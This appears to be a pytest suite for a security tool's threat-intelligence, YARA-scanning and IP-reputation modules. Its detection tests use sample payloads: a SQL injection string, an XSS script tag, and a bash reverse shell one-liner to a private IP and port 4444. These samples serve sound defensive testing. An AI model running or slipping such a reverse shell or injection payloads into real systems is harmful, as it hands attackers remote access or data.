"""
Unit tests for analysis modules
"""

import pytest
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from lurenet.analysis import ThreatIntelligence, YARAScanner, IPReputation


class TestThreatIntelligence:
    """Test Threat Intelligence module"""

    def test_detect_hash_type(self):
        """Test hash type detection"""
        intel = ThreatIntelligence()

        # MD5
        md5 = "5d41402abc4b2a76b9719d911017c592"
        assert intel._detect_hash_type(md5) == 'md5'

        # SHA1
        sha1 = "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"
        assert intel._detect_hash_type(sha1) == 'sha1'

        # SHA256
        sha256 = "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
        assert intel._detect_hash_type(sha256) == 'sha256'

    def test_analyze_hash_structure(self):
        """Test hash analysis returns correct structure"""
        intel = ThreatIntelligence()

        # Test with known clean hash (unlikely to be in threat databases)
        result = intel.analyze_hash("0" * 64)

        assert 'hash' in result
        assert 'hash_type' in result
        assert 'sources' in result
        assert 'verdict' in result
        assert 'threat_score' in result

        assert result['hash_type'] == 'sha256'
        assert isinstance(result['sources'], dict)
        assert isinstance(result['threat_score'], int)

    def test_analyze_url_structure(self):
        """Test URL analysis returns correct structure"""
        intel = ThreatIntelligence()

        # Test with safe URL
        result = intel.analyze_url("https://example.com")

        assert 'url' in result
        assert 'sources' in result
        assert 'verdict' in result
        assert 'threat_score' in result

        assert isinstance(result['sources'], dict)
        assert isinstance(result['threat_score'], int)

    def test_calculate_verdict(self):
        """Test verdict calculation"""
        intel = ThreatIntelligence()

        # Test malicious verdict
        sources_malicious = {
            'source1': {'found': True, 'verdict': 'malicious'}
        }
        assert intel._calculate_verdict(sources_malicious) == 'malicious'

        # Test clean verdict
        sources_clean = {
            'source1': {'found': False, 'verdict': 'clean'}
        }
        assert intel._calculate_verdict(sources_clean) == 'clean'

    def test_calculate_threat_score(self):
        """Test threat score calculation"""
        intel = ThreatIntelligence()

        # Test malicious score
        sources_malicious = {
            'source1': {'found': True, 'verdict': 'malicious'}
        }
        score = intel._calculate_threat_score(sources_malicious)
        assert score == 100

        # Test clean score
        sources_clean = {
            'source1': {'found': False, 'verdict': 'clean'}
        }
        score = intel._calculate_threat_score(sources_clean)
        assert score == 0


class TestYARAScanner:
    """Test YARA Scanner module"""

    def test_scanner_initialization(self):
        """Test scanner initializes correctly"""
        scanner = YARAScanner()
        assert scanner.compiled_rules is not None

    def test_scan_string_structure(self):
        """Test scan returns correct structure"""
        scanner = YARAScanner()

        result = scanner.scan_string("SELECT * FROM users", "sql_test")

        assert 'identifier' in result
        assert 'size' in result
        assert 'matches' in result
        assert 'matched_rules' in result
        assert 'severity' in result
        assert 'threat_score' in result

        assert isinstance(result['matches'], list)
        assert isinstance(result['matched_rules'], int)
        assert isinstance(result['threat_score'], int)

    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        scanner = YARAScanner()

        # Test SQL injection payload
        result = scanner.scan_string("' OR '1'='1", "sqli_test")

        assert result['matched_rules'] > 0
        assert any('SQL' in match['rule'] for match in result['matches'])

    def test_xss_detection(self):
        """Test XSS pattern detection"""
        scanner = YARAScanner()

        # Test XSS payload
        result = scanner.scan_string("<script>alert('xss')</script>", "xss_test")

        assert result['matched_rules'] > 0
        assert any('XSS' in match['rule'] for match in result['matches'])

    def test_reverse_shell_detection(self):
        """Test reverse shell pattern detection"""
        scanner = YARAScanner()

        # Test reverse shell command
        result = scanner.scan_string("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "revshell_test")

        assert result['matched_rules'] > 0
        assert result['severity'] in ['critical', 'high']

    def test_clean_data_scan(self):
        """Test scanning clean data"""
        scanner = YARAScanner()

        # Test benign text
        result = scanner.scan_string("Hello, this is a normal text.", "clean_test")

        assert result['matched_rules'] == 0
        assert result['severity'] == 'clean'
        assert result['threat_score'] == 0

    def test_severity_calculation(self):
        """Test severity calculation"""
        scanner = YARAScanner()

        # Test critical severity
        matches_critical = [
            {'meta': {'severity': 'critical'}}
        ]
        assert scanner._calculate_severity(matches_critical) == 'critical'

        # Test clean (no matches)
        assert scanner._calculate_severity([]) == 'clean'

    def test_threat_score_calculation(self):
        """Test threat score calculation"""
        scanner = YARAScanner()

        # Test critical score
        matches_critical = [
            {'meta': {'severity': 'critical'}}
        ]
        score = scanner._calculate_threat_score(matches_critical)
        assert score == 100

        # Test clean score
        score = scanner._calculate_threat_score([])
        assert score == 0

    def test_get_rule_info(self):
        """Test rule info retrieval"""
        scanner = YARAScanner()

        info = scanner.get_rule_info()

        assert 'builtin_rules' in info
        assert 'custom_rules' in info
        assert 'total_rules' in info
        assert 'rule_categories' in info

        assert info['builtin_rules'] > 0
        assert isinstance(info['rule_categories'], list)


class TestIPReputation:
    """Test IP Reputation module"""

    def test_ip_lookup_structure(self):
        """Test IP lookup returns correct structure"""
        ip_rep = IPReputation()

        # Test with public IP (Google DNS)
        result = ip_rep.lookup("8.8.8.8")

        assert 'ip' in result
        assert 'geolocation' in result
        assert 'reputation' in result
        assert 'threat_score' in result
        assert 'verdict' in result

        assert result['ip'] == "8.8.8.8"
        assert isinstance(result['geolocation'], dict)
        assert isinstance(result['threat_score'], int)

    def test_calculate_threat_score(self):
        """Test threat score calculation"""
        ip_rep = IPReputation()

        # Test clean IP
        result_clean = {
            'reputation': {'threat_lists': []},
            'is_proxy': False,
            'is_vpn': False,
            'is_tor': False,
            'geolocation': {'is_hosting': False}
        }
        score = ip_rep._calculate_threat_score(result_clean)
        assert score == 0

        # Test suspicious IP
        result_suspicious = {
            'reputation': {'threat_lists': ['ThreatFox']},
            'is_proxy': True,
            'is_vpn': False,
            'is_tor': False,
            'geolocation': {'is_hosting': False}
        }
        score = ip_rep._calculate_threat_score(result_suspicious)
        assert score > 0

    def test_calculate_verdict(self):
        """Test verdict calculation"""
        ip_rep = IPReputation()

        # Test malicious verdict
        result_malicious = {'threat_score': 80}
        assert ip_rep._calculate_verdict(result_malicious) == 'malicious'

        # Test clean verdict
        result_clean = {'threat_score': 10}
        assert ip_rep._calculate_verdict(result_clean) == 'clean'

    def test_cache_functionality(self):
        """Test IP lookup caching"""
        ip_rep = IPReputation()

        # First lookup
        result1 = ip_rep.lookup("8.8.8.8")

        # Second lookup (should use cache)
        result2 = ip_rep.lookup("8.8.8.8")

        # Results should be identical
        assert result1['ip'] == result2['ip']

        # Cache should contain the IP
        assert "8.8.8.8" in ip_rep.cache

    def test_clear_cache(self):
        """Test cache clearing"""
        ip_rep = IPReputation()

        # Add to cache
        ip_rep.lookup("8.8.8.8")
        assert len(ip_rep.cache) > 0

        # Clear cache
        ip_rep.clear_cache()
        assert len(ip_rep.cache) == 0

    def test_get_stats(self):
        """Test statistics retrieval"""
        ip_rep = IPReputation()

        stats = ip_rep.get_stats()

        assert 'cached_ips' in stats
        assert 'cache_ttl_hours' in stats
        assert isinstance(stats['cached_ips'], int)
        assert isinstance(stats['cache_ttl_hours'], (int, float))


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
